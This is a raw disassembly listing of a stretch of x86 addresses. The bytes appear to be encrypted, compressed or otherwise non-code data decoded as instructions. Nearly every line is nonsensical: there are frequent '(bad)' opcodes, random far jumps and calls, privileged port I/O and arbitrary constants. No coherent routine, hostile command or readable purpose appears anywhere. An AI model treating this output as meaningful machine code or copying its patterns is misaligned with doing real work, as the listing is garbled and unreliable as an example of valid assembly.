  418d4d:	rcr    BYTE PTR [ebp+0x48],cl
  418d50:	sbb    eax,0xfafc674e
  418d55:	dec    ebx
  418d56:	inc    ebx
  418d57:	push   eax
  418d58:	adc    bh,dh
  418d5a:	jge    0x418db9
  418d5c:	jmp    0x107a:0x1ffe1974
  418d63:	mov    dh,0x33
  418d65:	xor    edi,edx
  418d67:	cmp    edx,DWORD PTR [ebx]
  418d69:	fs push ebp
  418d6b:	and    eax,0xeba84543
  418d70:	xchg   edx,eax
  418d71:	clc    
  418d72:	mov    ch,0x9b
  418d74:	xchg   BYTE PTR [edi-0x58],ch
  418d77:	(bad)  
  418d78:	into   
  418d79:	out    dx,eax
  418d7a:	pop    edx
  418d7b:	jmp    0xb7e5:0xf39f3334
  418d82:	int    0x8d
  418d84:	rcl    DWORD PTR [edi],cl
  418d86:	test   esi,0x6422b08c
  418d8c:	aam    0x91
  418d8e:	fwait
  418d8f:	inc    esp
  418d90:	stc    
  418d91:	push   eax
  418d92:	add    al,0x4d
  418d94:	ins    BYTE PTR es:[edi],dx
  418d95:	xchg   edx,eax
  418d96:	xor    DWORD PTR [esp+ebx*1],edi
  418d99:	cli    
  418d9a:	inc    esi
  418d9b:	adc    dl,BYTE PTR [edi+0x15]
  418d9e:	scas   al,BYTE PTR es:[edi]
  418d9f:	mov    eax,0x3f6ebf7a
  418da4:	loope  0x418d9f
  418da6:	mov    ah,0x95
  418da8:	(bad)  
  418da9:	(bad)  
  418daa:	js     0x418de3
  418dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dad:	bound  edx,QWORD PTR [edi+0x5488089]
  418db3:	xchg   BYTE PTR [ebp+0x54],ch
  418db6:	jg     0x418dc3
  418db8:	lea    ecx,[ebx-0x4f]
  418dbb:	cmp    BYTE PTR [eax-0x7f],dh
  418dbe:	mov    WORD PTR [eax],?
  418dc0:	and    BYTE PTR [edi],bh
  418dc2:	sbb    eax,0x6d9931fa
  418dc7:	out    dx,eax
  418dc8:	rcl    BYTE PTR [edx-0x842af40],0xf5
  418dcf:	out    dx,eax
  418dd0:	js     0x418d72
  418dd2:	test   eax,0xea4776e3
  418dd7:	xchg   ebp,eax
  418dd8:	push   esi
  418dd9:	sbb    ebp,esp
  418ddb:	test   DWORD PTR [edi+0x63],edi
  418dde:	push   es
  418ddf:	xor    edx,edi
  418de1:	push   ecx
  418de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de3:	sub    al,0x7c
  418de5:	adc    bh,BYTE PTR [edx-0x4f]
  418de8:	mov    ds:0x52dd85f1,al
  418ded:	(bad)
  418df0:	jnp    0x418e34
  418df2:	jg     0x418e5e
  418df4:	inc    esi
  418df5:	xchg   DWORD PTR [eax],esi
  418df7:	pop    ds
  418df8:	pop    ss
  418df9:	out    dx,eax
  418dfa:	lods   eax,DWORD PTR ds:[esi]
  418dfb:	cwde   
  418dfc:	jle    0x418dda
  418dfe:	sbb    cl,BYTE PTR ds:0x7176da4f
  418e04:	inc    ecx
  418e05:	(bad)  [esp+esi*2+0x1765901f]
  418e0c:	out    0xee,eax
  418e0e:	jnp    0x418dd7
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x26]
  418e81:	ins    DWORD PTR es:[edi],dx
  418e82:	mov    edx,ds
  418e84:	mov    al,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	js     0x418edc
  418e8e:	jge    0x418e9d
  418e90:	cmp    dl,BYTE PTR [ebx-0x7be8144d]
  418e96:	lock jbe 0x418e96
  418e99:	imul   ebx,DWORD PTR [esi-0x13],0xeae8abce
  418ea0:	scas   eax,DWORD PTR es:[edi]
  418ea1:	ss ins BYTE PTR es:[edi],dx
  418ea3:	xor    eax,0xea45db16
  418ea8:	aam    0xf3
  418eaa:	dec    esp
  418eab:	push   eax
  418eac:	and    ah,BYTE PTR [ebp+0x5a]
  418eaf:	retf   0x9799
  418eb2:	adc    DWORD PTR [esi-0xd316108],ebp
  418eb8:	je     0x418f07
  418eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ebb:	jns    0x418e52
  418ebd:	jns    0x418efc
  418ebf:	add    al,0xb8
  418ec1:	jae    0x418efc
  418ec3:	push   ss
  418ec4:	sub    bh,bl
  418ec6:	sub    ecx,DWORD PTR [edx+0x47]
  418ec9:	stos   BYTE PTR es:[edi],al
  418eca:	cld    
  418ecb:	loop   0x418ed5
  418ecd:	inc    esp
  418ece:	mov    ds:0xcf611fc7,eax
  418ed3:	xchg   esp,eax
  418ed4:	loopne 0x418e89
  418ed6:	loop   0x418f53
  418ed8:	xchg   dx,ax
  418eda:	mov    al,ds:0xfda8f7fa
  418edf:	retf   0x8f55
  418ee2:	cs adc bl,0xb2
  418ee6:	pushf  
  418ee7:	and    esi,DWORD PTR [eiz*8+0x5fdf9c2]
  418eee:	or     DWORD PTR [edi],ebp
  418ef0:	fiadd  DWORD PTR [edx+0x35]
  418ef3:	xchg   ebx,eax
  418ef4:	cmp    DWORD PTR [ebx+0x75388b5b],eax
  418efa:	sub    dl,dh
  418efc:	leave  
  418efd:	aaa    
  418efe:	scas   al,BYTE PTR es:[edi]
  418eff:	xor    al,0x33
  418f01:	test   al,0x17
  418f03:	xor    ch,ch
  418f05:	enter  0x4f1e,0xe4
  418f09:	fldcw  WORD PTR [edi-0x5f7fa8ad]
  418f0f:	(bad)  
  418f10:	mov    ch,0xf9
  418f12:	sub    eax,0xa74355a7
  418f17:	ret    
  418f18:	dec    ebp
  418f19:	fild   QWORD PTR [eax-0x4]
  418f1c:	out    dx,eax
  418f1d:	fstp   st(5)
  418f1f:	mov    dl,0xc8
  418f21:	imul   ebp,DWORD PTR [ecx-0x52],0xb74f57e0
  418f28:	cmp    DWORD PTR ds:0x3d70c441,0xffffffe2
  418f2f:	adc    al,0x83
  418f31:	(bad)  
  418f32:	mov    DWORD PTR [eax+0x7b80f040],edx
  418f38:	xchg   esi,eax
  418f39:	ret    
  418f3a:	std    
  418f3b:	aaa    
  418f3c:	jne    0x418fb1
  418f3e:	jnp    0x418f3a
  418f40:	xchg   edx,eax
  418f41:	outs   dx,DWORD PTR ds:[esi]
  418f42:	cmp    al,0x82
  418f44:	imul   ebp,DWORD PTR [esi-0x5e],0xad951b7d
  418f4b:	nop
  418f4c:	push   0x3ac56bb1
  418f51:	fisub  WORD PTR [ebp+esi*1+0x3addd00b]
  418f58:	cmp    dh,BYTE PTR [edx-0x223e8cac]
  418f5e:	and    DWORD PTR [edx+eiz*2-0x3fe457cf],esi
  418f65:	retf   0x3822
  418f68:	pop    ebx
  418f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f6a:	xchg   ecx,eax
  418f6b:	pop    ss
  418f6c:	cmc    
  418f6d:	sub    ah,ah
  418f6f:	mov    esi,0x2dedaa2e
  418f74:	xchg   esp,eax
  418f75:	int3   
  418f76:	lods   al,BYTE PTR ds:[esi]
  418f77:	xchg   edx,eax
  418f78:	call   0x2c673d01
  418f7d:	jg     0x418f63
  418f7f:	and    eax,0x204eb226
  418f84:	dec    eax
  418f85:	(bad)  
  418f86:	aam    0x5b
  418f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f89:	mov    edi,0xe6c90d67
  418f8e:	fisttp DWORD PTR [eax+0x0]
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x3c150e59]
  419001:	enter  0xd436,0xb4
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR [ecx+eax*1],al
  41900a:	add    BYTE PTR [eax],al
  41900c:	jp     0x419035
  41900e:	in     al,0x25
  419010:	pop    ds
  419011:	and    al,0x8d
  419013:	jb     0x419009
  419015:	push   ecx
  419016:	clc    
  419017:	in     eax,dx
  419018:	fcom   QWORD PTR [ebp-0x135361cd]
  41901e:	dec    edi
  41901f:	jmp    0x8a179a44
  419024:	lods   al,BYTE PTR ds:[esi]
  419025:	add    dh,BYTE PTR [esi-0x12]
  419028:	or     edi,edi
  41902a:	loope  0x419045
  41902c:	cmp    esp,esp
  41902e:	add    DWORD PTR [edi-0x60],edi
  419031:	mov    cl,0x68
  419033:	data16 mov bh,0xbf
  419036:	or     al,0xb1
  419038:	add    edi,eax
  41903a:	dec    esp
  41903b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903c:	leave  
  41903d:	add    cl,BYTE PTR [eax+0x123526a3]
  419043:	ss mov dl,0xce
  419046:	xor    dh,BYTE PTR [eax+eax*4-0x5b]
  41904a:	dec    edi
  41904b:	cmc    
  41904c:	pop    esp
  41904d:	mov    gs,WORD PTR [edi-0x705557b2]
  419053:	fs call 0xf1902154
  419059:	jno    0x41901d
  41905b:	jmp    0x67413ec1
  419060:	cmc    
  419061:	cld    
  419062:	mov    cl,0x52
  419064:	and    DWORD PTR [edx+ebx*8-0x6],0x18
  419069:	(bad)  
  41906a:	pop    ecx
  41906b:	jns    0x4190e2
  41906d:	pop    DWORD PTR [esi+0x28db5e56]
  419073:	retf   0xccbf
  419076:	xor    esi,0xffffff8b
  419079:	cmp    edi,DWORD PTR [ebx]
  41907b:	int3   
  41907c:	fisttp DWORD PTR [ebx-0x57d38b86]
  419082:	add    cl,BYTE PTR [esi-0x5c13fc27]
  419088:	loopne 0x41901e
  41908a:	popf   
  41908b:	int    0xed
  41908d:	pop    edx
  41908e:	pop    esi
  41908f:	bound  ebx,QWORD PTR [edx+0x636e92d4]
  419095:	(bad)  
  419096:	sbb    BYTE PTR [ebp-0x5256c4f0],dh
  41909c:	mov    BYTE PTR [esi],0x6e
  41909f:	ror    BYTE PTR [eax+0x5b02741d],cl
  4190a5:	arpl   WORD PTR [ebx+0x79],bp
  4190a8:	fbstp  TBYTE PTR [esi-0x15]
  4190ab:	push   edi
  4190ac:	adc    BYTE PTR [edx-0x65f53199],dh
  4190b2:	add    dl,BYTE PTR [ecx+edx*1]
  4190b5:	jg     0x41911c
  4190b7:	or     DWORD PTR [ebx-0x25b212e2],ebx
  4190bd:	ror    BYTE PTR [ebp-0x3f6d3c05],1
  4190c3:	push   esi
  4190c4:	sub    BYTE PTR [ebp+0x1701d451],bh
  4190ca:	or     eax,0xe11b0541
  4190cf:	hlt    
  4190d0:	sub    al,0x8f
  4190d2:	bound  ebx,QWORD PTR [esi+0x3]
  4190d5:	test   al,0x37
  4190d7:	cld    
  4190d8:	lods   al,BYTE PTR ds:[esi]
  4190d9:	rcl    DWORD PTR [ecx],1
  4190db:	or     al,0x35
  4190dd:	cwde   
  4190de:	mov    ds:0xf689584b,al
  4190e3:	xor    al,0x81
  4190e5:	mov    ds:0x8b6d9ac6,al
  4190ea:	xchg   ebp,eax
  4190eb:	sbb    al,0xa2
  4190ed:	xor    BYTE PTR [eax],al
  4190ef:	mov    ebx,0x8e5f9491
  4190f4:	mov    cl,0xe6
  4190f6:	mov    ds:0xa4ee8354,al
  4190fb:	inc    edx
  4190fc:	pop    ecx
  4190fd:	dec    edi
  4190fe:	and    BYTE PTR [esi-0x793af2a9],0x78
  419105:	xor    DWORD PTR [ebx],esi
  419107:	jg     0x41914a
  419109:	fimul  DWORD PTR [ebx+0x4aaeb8ab]
  41910f:	loope  0x419111
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     bl,BYTE PTR [edx-0x470c5a54]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	dec    ebp
  41918d:	xchg   edi,eax
  41918e:	jnp    0x4191d7
  419190:	ror    DWORD PTR [esi+ebp*8],0xa2
  419194:	adc    al,0x1f
  419197:	(bad)  
  419198:	xchg   ecx,eax
  419199:	xor    DWORD PTR [esi],esp
  41919b:	xor    dh,ch
  41919d:	add    BYTE PTR [ebp-0x43],0x2c
  4191a1:	mov    BYTE PTR [edi+0x50732030],ch
  4191a7:	les    edi,FWORD PTR [edx]
  4191a9:	mov    esi,0xc39e7062
  4191ae:	push   0xffffffa9
  4191b0:	dec    edx
  4191b1:	arpl   WORD PTR [eax],sp
  4191b3:	cld    
  4191b4:	not    DWORD PTR [ebx+edi*4]
  4191b7:	pop    es
  4191b8:	mov    bh,0xb4
  4191ba:	and    ah,al
  4191bc:	push   ecx
  4191bd:	pop    ds
  4191be:	mov    esp,0x8c59fd16
  4191c3:	push   ebx
  4191c4:	pop    edx
  4191c5:	ins    BYTE PTR es:[edi],dx
  4191c6:	div    BYTE PTR [edi]
  4191c8:	addr16 nop
  4191ca:	pop    eax
  4191cb:	jmp    0xe13a6c05
  4191d0:	jp     0x41916b
  4191d2:	and    DWORD PTR [ebx],0xffffffa7
  4191d5:	addr16 mov al,0xf2
  4191d8:	test   BYTE PTR [ecx+eax*2-0x15],ch
  4191dc:	dec    esp
  4191dd:	test   BYTE PTR [esi],bh
  4191df:	das    
  4191e0:	adc    eax,DWORD PTR [edx+0x32b38100]
  4191e6:	add    dh,BYTE PTR [ecx+0x23]
  4191e9:	push   0xffffffa8
  4191eb:	xchg   esp,eax
  4191ec:	adc    ah,BYTE PTR [ebp-0x40c24a05]
  4191f2:	xor    eax,0xeff3027e
  4191f7:	(bad)  
  4191f8:	mov    edx,0x8600def7
  4191fd:	add    eax,0x17c677cc
  419202:	lock (bad) 
  419204:	lahf   
  419205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419206:	jns    0x4191e8
  419208:	inc    esi
  419209:	jmp    0x2009:0x7e38ca94
  419210:	cli    
  419211:	rol    BYTE PTR [edx-0x44a481a7],cl
  419217:	mov    ch,0x48
  419219:	test   esp,esp
  41921b:	jbe    0x419289
  41921d:	mov    bh,0xac
  41921f:	iret   
  419220:	push   edi
  419221:	adc    eax,0x8c0f5a1a
  419226:	mov    si,WORD PTR [ebp+edi*1+0x11d4e56d]
  41922e:	stos   DWORD PTR es:[edi],eax
  41922f:	icebp  
  419230:	xchg   ecx,eax
  419231:	pop    ecx
  419232:	mov    fs,WORD PTR [ebx]
  419234:	stc    
  419235:	pushf  
  419236:	and    ch,BYTE PTR [edi+0x55]
  419239:	(bad)  
  41923a:	inc    esp
  41923b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41923c:	mov    BYTE PTR [esi],bl
  41923e:	mov    cl,0xe1
  419240:	add    DWORD PTR [eax-0x3f5dedce],eax
  419246:	jecxz  0x4192b3
  419248:	mov    al,ds:0x39f4f504
  41924d:	lahf   
  41924e:	inc    esp
  41924f:	lock and al,0xc6
  419252:	cmc    
  419253:	fsub   st(2),st
  419255:	sbb    esi,DWORD PTR [ecx]
  419257:	push   cs
  419258:	icebp  
  419259:	fmul   DWORD PTR [ebp-0x21]
  41925c:	inc    eax
  41925d:	ror    cl,1
  41925f:	stos   BYTE PTR es:[edi],al
  419260:	mov    eax,edi
  419262:	and    ch,dl
  419264:	pop    edx
  419265:	add    eax,0xcce7799e
  41926a:	inc    ebx
  41926b:	mov    dh,0x41
  41926d:	xor    ah,BYTE PTR [eax]
  41926f:	xor    cl,dh
  419271:	cmp    ah,BYTE PTR [ecx+0x5a8a9dac]
  419277:	ds pop ebp
  419279:	cdq    
  41927a:	mov    esp,0x1816de7b
  41927f:	in     al,0xe2
  419281:	stos   DWORD PTR es:[edi],eax
  419282:	xor    BYTE PTR [ebx-0x27],ch
  419285:	popa   
  419286:	call   0xabdd:0xfcb6603d
  41928d:	daa    
  41928e:	loopne 0x4192e5
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	hlt    
  419301:	inc    eax
  419302:	outs   dx,BYTE PTR ds:[esi]
  419303:	mov    dh,0xbc
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR [ecx+eax*1],al
  41930a:	add    BYTE PTR [eax],al
  41930c:	(bad)  
  41930d:	mov    ebx,0xcb8425a7
  419312:	dec    eax
  419313:	out    0x83,al
  419315:	jne    0x419301
  419317:	(bad)  
  419318:	xor    ah,BYTE PTR [edx]
  41931a:	sbb    al,0x75
  41931c:	movnti DWORD PTR [eax+0x7ee937c8],esp
  419323:	mov    ecx,0x434c1408
  419328:	add    al,0x41
  41932a:	xor    BYTE PTR [esi+0x2c],dh
  41932d:	lods   eax,DWORD PTR ds:[esi]
  41932e:	inc    ecx
  41932f:	jl     0x4192c5
  419331:	sub    ch,BYTE PTR [edx]
  419333:	mov    edx,0xc7abea13
  419338:	sub    eax,0xdcf9447e
  41933d:	adc    bh,BYTE PTR [ebp+ecx*1+0x7f]
  419341:	pushf  
  419342:	jbe    0x4193b6
  419344:	and    BYTE PTR [edx],ch
  419346:	jo     0x4192fa
  419348:	xor    ah,BYTE PTR [ebp+0x95b0103]
  41934e:	idiv   ch
  419350:	and    BYTE PTR [ebp-0x59f5350d],bh
  419356:	fwait
  419357:	repz mov esp,0x52508a84
  41935d:	inc    ecx
  41935e:	enter  0xc23c,0x1e
  419362:	stos   BYTE PTR es:[edi],al
  419363:	pop    esi
  419364:	or     al,ah
  419366:	and    eax,0x9142c9f4
  41936b:	push   ss
  41936c:	mov    ebp,0xfa609d82
  419371:	and    al,0x49
  419373:	adc    BYTE PTR [ecx-0x69],cl
  419376:	setl   BYTE PTR [eax+0x2df3b183]
  41937d:	popf   
  41937e:	icebp  
  41937f:	add    eax,0x50d41d2b
  419384:	xchg   ebx,eax
  419385:	mov    ecx,0xb085829b
  41938a:	sub    eax,0x451e89f
  41938f:	ss push 0xffffffe8
  419392:	xor    al,0x70
  419394:	(bad)  
  419395:	xchg   esp,eax
  419396:	aad    0xb9
  419398:	sbb    DWORD PTR [edx+0x4f17d1a6],edi
  41939e:	ret    
  41939f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a0:	xchg   ebx,eax
  4193a1:	sub    DWORD PTR [edx+0x23f1d5f4],ecx
  4193a7:	leave  
  4193a8:	es (bad) 
  4193aa:	popf   
  4193ab:	ror    ah,0xde
  4193ae:	xchg   edx,eax
  4193af:	rol    ch,0x20
  4193b2:	mov    eax,ds:0x52c866cc
  4193b7:	sub    al,0x5b
  4193b9:	push   esp
  4193ba:	fst    QWORD PTR [ecx+ecx*8-0x20]
  4193be:	dec    edi
  4193bf:	popa   
  4193c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193c1:	push   ebx
  4193c2:	arpl   WORD PTR ds:[ebp+0x59dc685b],cx
  4193c9:	xor    al,BYTE PTR [ecx]
  4193cb:	sub    al,0xd0
  4193cd:	bound  edi,QWORD PTR [eax-0x4e89be01]
  4193d3:	mov    eax,0xbd59f7e2
  4193d8:	cmp    esi,DWORD PTR [ecx-0x3b5621fb]
  4193de:	jne    0x4193f1
  4193e0:	push   ds
  4193e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193e2:	adc    eax,0xd2cc4707
  4193e7:	ins    BYTE PTR es:[edi],dx
  4193e8:	pop    ebp
  4193e9:	stos   BYTE PTR es:[edi],al
  4193ea:	mov    eax,ds:0x39eb3d7b
  4193ef:	or     edx,DWORD PTR [esi+0x40]
  4193f2:	cmc    
  4193f3:	mov    ecx,0x500a2434
  4193f8:	ret    0xf6d8
  4193fb:	and    al,BYTE PTR [eax-0x78]
  4193fe:	mov    dl,0xe
  419400:	mov    al,ds:0xfe3a9a5e
  419405:	add    eax,DWORD PTR [eax+0x4d]
  419408:	push   0xffffffa0
  41940a:	mov    ch,0x3b
  41940c:	jno    0x419397
  41940e:	outs   dx,DWORD PTR ds:[esi]
  41940f:	out    dx,al
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	cmp    esi,DWORD PTR [eax+0xbc0afd5]
  419486:	add    DWORD PTR [eax],eax
  419488:	add    al,0x1
  41948a:	add    BYTE PTR [eax],al
  41948c:	mov    ds:0x14366bbb,eax
  419491:	std    
  419492:	fld    DWORD PTR [esi-0x7b]
  419495:	in     al,dx
  419496:	repnz cmp esi,edi
  419499:	in     al,0xe2
  41949b:	mov    edi,0xe3f2f25
  4194a0:	sub    eax,0x2d579e47
  4194a5:	or     BYTE PTR ds:0xe0226dbc,ah
  4194ab:	out    0xe4,eax
  4194ad:	push   es
  4194ae:	mov    ss,WORD PTR [edx+0x30923722]
  4194b4:	lahf   
  4194b5:	sbb    ecx,edx
  4194b7:	stos   DWORD PTR es:[edi],eax
  4194b8:	test   DWORD PTR [ebx-0x1d02ff41],0x21f95e4a
  4194c2:	push   0xc1ea3976
  4194c7:	stos   DWORD PTR es:[edi],eax
  4194c8:	enter  0xb0b0,0x5
  4194cc:	mov    bx,0x239a
  4194d0:	sbb    eax,0xb096acd7
  4194d5:	inc    esi
  4194d6:	into   
  4194d7:	mov    dh,dl
  4194d9:	mov    BYTE PTR [eax],bl
  4194db:	(bad)  
  4194dc:	js     0x419486
  4194de:	out    0x7c,eax
  4194e0:	scas   al,BYTE PTR es:[edi]
  4194e1:	popf   
  4194e2:	test   DWORD PTR [eax-0x5f34b5d2],ebp
  4194e8:	pop    esi
  4194e9:	and    cl,bl
  4194eb:	les    edx,FWORD PTR [ebx-0x31d07bdb]
  4194f1:	push   ecx
  4194f2:	mov    dh,0x19
  4194f4:	mov    cl,0xfb
  4194f6:	xchg   ebp,eax
  4194f7:	xchg   ebx,ebx
  4194f9:	arpl   cx,cx
  4194fb:	jg     0x419534
  4194fd:	fadd   DWORD PTR [eax+edx*2]
  419500:	ss mov esi,esi
  419503:	jae    0x4194aa
  419505:	lock adc esp,DWORD PTR [ebx]
  419508:	jns    0x4194ab
  41950a:	jb     0x4194db
  41950c:	ins    DWORD PTR es:[edi],dx
  41950d:	mov    esp,0x15f2541e
  419512:	and    al,0x57
  419514:	ins    BYTE PTR es:[edi],dx
  419515:	xchg   esp,eax
  419516:	stos   BYTE PTR es:[edi],al
  419517:	popf   
  419518:	(bad)  
  419519:	sub    ch,BYTE PTR ds:0xafc6c698
  41951f:	push   0xfffffff8
  419521:	jmp    0x25d1:0xf6dae52b
  419528:	sub    eax,0x47567635
  41952d:	and    BYTE PTR [ebp+0x1],ch
  419530:	test   al,0x3d
  419532:	pushf  
  419533:	ins    DWORD PTR es:[edi],dx
  419534:	jle    0x419536
  419536:	pop    ecx
  419537:	mov    ebp,0xd3c80d8
  41953c:	fistp  DWORD PTR ds:0x4af0628
  419542:	popa   
  419543:	inc    eax
  419544:	cmp    eax,0xd7e8625b
  419549:	inc    edi
  41954a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41954b:	add    DWORD PTR [eax+0x3ef3cdbc],ebp
  419551:	jp     0x41950d
  419553:	xlat   BYTE PTR ds:[ebx]
  419554:	mov    ebx,DWORD PTR [edi]
  419556:	push   0x605b9093
  41955b:	iret   
  41955c:	out    0x63,eax
  41955e:	(bad)  
  419560:	pop    ebx
  419561:	xchg   DWORD PTR [ebx],ebx
  419563:	cmp    dl,BYTE PTR [edx-0x27ff8b60]
  419569:	sub    al,0x38
  41956b:	or     DWORD PTR [eax-0x5b6bdbed],ebx
  419571:	pop    ebp
  419572:	xchg   ebp,eax
  419573:	xchg   edi,edx
  419575:	es inc esi
  419577:	fucom  st(2)
  419579:	(bad)  
  41957a:	jmp    0x4195a8
  41957c:	sub    ecx,DWORD PTR [ecx-0x1e672863]
  419582:	imul   eax,edx,0x3d
  419585:	aad    0xf6
  419587:	out    0x1d,al
  419589:	mov    bl,0x98
  41958b:	adc    esp,DWORD PTR [edi+0xf]
  41958e:	push   esp
  41958f:	mov    eax,ds:0x0
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	test   BYTE PTR [esi],ch
  419602:	fisub  WORD PTR [ebx]
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	in     al,0x1b
  41960e:	inc    ebx
  41960f:	loop   0x41967b
  419611:	out    dx,al
  419612:	xchg   ebp,eax
  419613:	lods   eax,DWORD PTR ds:[esi]
  419614:	or     eax,0x968ea567
  419619:	imul   eax,DWORD PTR [ebx],0xd52d4ecc
  41961f:	pusha  
  419620:	jle    0x41961a
  419622:	fmul   QWORD PTR [ebx+0x18]
  419625:	cmp    ch,BYTE PTR [ebx+0xa]
  419628:	(bad)  
  419629:	cmpps  xmm3,xmm6,0x59
  41962d:	sbb    al,0xdd
  41962f:	in     al,dx
  419630:	mov    ds:0x69140f9e,eax
  419635:	jno    0x419618
  419637:	or     dh,BYTE PTR [ecx-0x60262733]
  41963d:	aad    0x25
  41963f:	xchg   edx,eax
  419640:	jmp    0x41960a
  419642:	dec    ebp
  419643:	push   edi
  419644:	lock sbb DWORD PTR cs:[edx-0x17],ebp
  419649:	es jns 0x419656
  41964c:	popf   
  41964d:	mov    dh,BYTE PTR [esi+0x2558a73f]
  419653:	add    eax,0xb3be1949
  419658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419659:	or     DWORD PTR [edx],ebp
  41965b:	loope  0x419668
  41965d:	std    
  41965e:	push   ecx
  41965f:	cs loop 0x41960d
  419662:	aad    0xfb
  419664:	pop    ds
  419665:	jg     0x419664
  419667:	(bad)  
  419668:	not    DWORD PTR [edx]
  41966a:	mov    esi,0x44a51765
  41966f:	or     al,0x24
  419671:	aad    0x6c
  419673:	dec    edx
  419674:	imul   esp,DWORD PTR [esp+esi*8],0x1f
  419678:	es jge 0x41965f
  41967b:	add    BYTE PTR [edx],dl
  41967d:	pcmpeqb mm7,QWORD PTR [ebp+edi*4-0x5d]
  419682:	jle    0x4196d3
  419684:	xchg   esp,eax
  419685:	shl    DWORD PTR [edi+0x6d],0x62
  419689:	test   edx,edi
  41968b:	sar    BYTE PTR [edi],0xb5
  41968e:	data16 mov al,0x30
  419691:	cdq    
  419692:	jl     0x419692
  419694:	inc    eax
  419695:	add    BYTE PTR [ebx-0x34715651],cl
  41969b:	(bad)  
  41969c:	retf   0x24fb
  41969f:	xlat   BYTE PTR ss:[ebx]
  4196a1:	icebp  
  4196a2:	xchg   ebx,eax
  4196a3:	mov    dl,0xd
  4196a5:	cmp    eax,0x64fb844e
  4196aa:	inc    esi
  4196ab:	fcmovnu st,st(5)
  4196ad:	out    dx,eax
  4196ae:	loope  0x4196d3
  4196b0:	(bad)  
  4196b2:	cmc    
  4196b3:	ret    
  4196b4:	dec    edi
  4196b5:	adc    al,0x3d
  4196b7:	data16 (bad) 
  4196b9:	(bad)  
  4196ba:	repnz sbb eax,0x1432d0c3
  4196c0:	mov    ds:0xad40b75c,al
  4196c5:	mov    bl,0x56
  4196c7:	jne    0x4196e6
  4196c9:	or     esp,edi
  4196cb:	rcl    BYTE PTR [edx],0x51
  4196ce:	add    ebp,DWORD PTR [ecx+0x65448175]
  4196d4:	adc    eax,0x308a9511
  4196d9:	push   cs
  4196da:	lock sbb BYTE PTR [edi*8+0x3272a017],cl
  4196e2:	fnstsw WORD PTR [ebp-0x3c6d57f9]
  4196e8:	mov    ebx,0x14194d66
  4196ed:	mov    al,ds:0x841fd481
  4196f2:	ror    ah,cl
  4196f4:	push   ebx
  4196f5:	ja     0x419677
  4196f7:	xadd   cl,al
  4196fa:	in     eax,dx
  4196fb:	xchg   BYTE PTR [ecx+0x6e],cl
  4196fe:	dec    edi
  4196ff:	fcmovne st,st(0)
  419701:	dec    edx
  419702:	pop    edx
  419704:	mov    esi,0x16e18aeb
  419709:	push   0x33
  41970b:	sbb    dl,bl
  41970d:	retf   0x9609
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xa48dd0ae
  419781:	outs   dx,BYTE PTR ds:[esi]
  419782:	aas    
  419783:	push   edx
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	mov    esp,0xd33ef37e
  419791:	mov    edi,0x22a5ea07
  419796:	js     0x41972c
  419798:	inc    edi
  419799:	dec    esp
  41979a:	add    ebp,ecx
  41979c:	mov    eax,0x74b1ab01
  4197a1:	push   ss
  4197a2:	pop    ss
  4197a3:	aam    0xc5
  4197a5:	in     al,dx
  4197a6:	push   ss
  4197a7:	(bad)  
  4197a8:	cld    
  4197a9:	xor    al,ah
  4197ab:	fiadd  DWORD PTR [ebx+0x2b]
  4197ae:	repz icebp 
  4197b0:	sahf   
  4197b1:	add    DWORD PTR [ecx+esi*2+0x1d],esp
  4197b5:	mov    BYTE PTR [edx+0x58],bh
  4197b8:	mov    BYTE PTR [esi+edi*2-0x44bdb826],bl
  4197bf:	inc    edi
  4197c0:	dec    ebp
  4197c1:	aas    
  4197c2:	jmp    0xeb50:0x5712db3e
  4197c9:	in     al,0x41
  4197cb:	scas   al,BYTE PTR es:[edi]
  4197cc:	dec    ecx
  4197cd:	mov    eax,0x1264eded
  4197d2:	jmp    0xaa2c:0xf263d7c9
